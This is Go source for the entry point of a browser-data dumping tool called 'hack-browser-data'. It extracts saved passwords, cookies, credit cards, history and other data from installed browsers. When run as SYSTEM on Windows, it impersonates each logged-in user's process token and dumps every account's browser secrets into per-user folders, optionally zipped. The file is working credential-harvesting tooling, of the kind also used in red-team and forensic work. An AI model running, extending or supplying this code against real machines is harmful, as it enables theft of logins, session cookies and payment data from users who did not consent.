package main

import (
	"fmt"
	"os"
	"os/user"
	"runtime"

	enumUserHomesWhileSystem "github.com/sh3d0ww01f/enumUserHomesWhileSystem/EnumUsersHomes"
	"github.com/urfave/cli/v2"

	"github.com/moond4rk/hackbrowserdata/browser"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
)

var (
	browserName  string
	outputDir    string
	outputFormat string
	verbose      bool
	compress     bool
	profilePath  string
	isFullExport bool
)

func checkisSystem() bool {
	currentUser, err := user.Current()
	if err != nil {
		return false
	}
	if currentUser.Username == "NT AUTHORITY\\SYSTEM" || currentUser.Username == "SYSTEM" {
		return true
	}
	return false
}
func main() {
	Execute()
}
func Execute() {
	app := &cli.App{
		Name:      "hack-browser-data",
		Usage:     "Export password|bookmark|cookie|history|credit card|download|localStorage|extension from browser",
		UsageText: "[hack-browser-data -b chrome -f json -dir results -cc]\nExport all browingdata(password/cookie/history/bookmark) from browser\nGithub Link: https://github.com/moonD4rk/HackBrowserData",
		Version:   "0.5.0",
		Flags: []cli.Flag{
			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "file name csv|json"},
			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
		},
		HideHelpCommand: true,
		Action: func(c *cli.Context) error {
			if verbose {
				log.SetVerbose()
			}
			if runtime.GOOS == "windows" && checkisSystem() {
				result, pids, err := enumUserHomesWhileSystem.GetUserHomes()
				if err != nil {
					return nil
				}
				for username, UserHome := range result {
					fmt.Printf("username:%s userhome [pid:%d]:%s\n", username, pids[username], UserHome)
					err := enumUserHomesWhileSystem.ImpersonateProcessToken(pids[username])
					if err != nil {
						log.Error(err)
						return nil
					}
					browser.MakeUserFile(UserHome, "")
					//默认获取所有用户的xx浏览器
					browsers, err := browser.PickBrowsers(browserName, "")
					if err != nil {
						log.Error(err)
					}
					for _, b := range browsers {
						data, err := b.BrowsingData(isFullExport)
						if err != nil {
							log.Error(err)
							continue
						}
						//输出到文件夹
						data.Output(outputDir+"/"+username, b.Name(), outputFormat)
					}
					enumUserHomesWhileSystem.RevertToSelf()
				}
			} else {
				//fmt.Printf(browserName)
				browser.MakeUserFile(browser.HomeDir, "")
				browsers, err := browser.PickBrowsers(browserName, profilePath)
				if err != nil {
					log.Error(err)
				}
				for _, b := range browsers {
					data, err := b.BrowsingData(isFullExport)
					if err != nil {
						log.Error(err)
						continue
					}
					data.Output(outputDir, b.Name(), outputFormat)
				}
			}
			//检查是否是nt/system权限
			if compress {
				//if err := fileutil.CompressDir(outputDir); err != nil {
				if err := fileutil.ZipDir(outputDir); err != nil {
					log.Error(err)
				}
				log.Noticef("compress success")
			}
			return nil
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		panic(err)
	}
}
